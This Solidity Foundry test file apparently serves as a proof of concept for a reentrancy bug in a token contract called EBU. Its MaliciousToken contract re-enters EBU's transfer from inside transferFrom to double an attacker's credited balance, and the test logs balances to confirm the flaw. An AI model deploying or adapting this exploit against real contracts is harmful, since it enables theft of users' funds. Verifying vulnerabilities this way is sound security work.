// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol";

contract MaliciousToken {
    address public immutable ATTACKER;
    EBU public immutable ebu;
    address private victim;
    bool private attacked;

    constructor(address _ebu) {
        ebu = EBU(_ebu);
        ATTACKER = address(this);
    }
    
    function startAttack(address _victim) external {
        victim = _victim;
        address[] memory tos = new address[](1);
        tos[0] = ATTACKER;
        uint[] memory vs = new uint[](1);
        vs[0] = 100;
        ebu.transfer(victim, address(this), tos, vs);
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        if (!attacked) {
            attacked = true;
            address[] memory tos = new address[](1);
            tos[0] = ATTACKER;
            uint[] memory vs = new uint[](1);
            vs[0] = 100;
            ebu.transfer(victim, address(this), tos, vs);
        }
        return true;
    }
}

contract EBUReentrancyTest is Test {
    EBU public ebu;
    MaliciousToken public maliciousToken;
    address public constant VICTIM = address(0x1111);

    function setUp() public {
        ebu = new EBU();
        maliciousToken = new MaliciousToken(address(ebu));
        ebu.authorizeToken(address(maliciousToken));
    }

    function testReentrancyAttack() public {
        console.log("--- BEFORE-Trigger Balance ---");
        uint256 attackStartBalance = ebu.getUserBalance(maliciousToken.ATTACKER());
        console.log("Attacker start balance:", attackStartBalance);

        console.log("--- Trigger Attack ---");
        maliciousToken.startAttack(VICTIM);

        console.log("--- AFTER-Trigger Balance ---");
        uint256 attackEndBalance = ebu.getUserBalance(maliciousToken.ATTACKER());
        console.log("Attacker end balance:", attackEndBalance);

        uint256 balanceChange = attackEndBalance - attackStartBalance;
        console.log("Attacker balance change:", balanceChange);

        if (balanceChange == 200) {
            console.log("Vulnerability Exists: Reentrancy attack doubled attacker balance");
        } else {
            console.log("Vulnerability not Exist: Balance change %s, expected 200", balanceChange);
        }
    }
}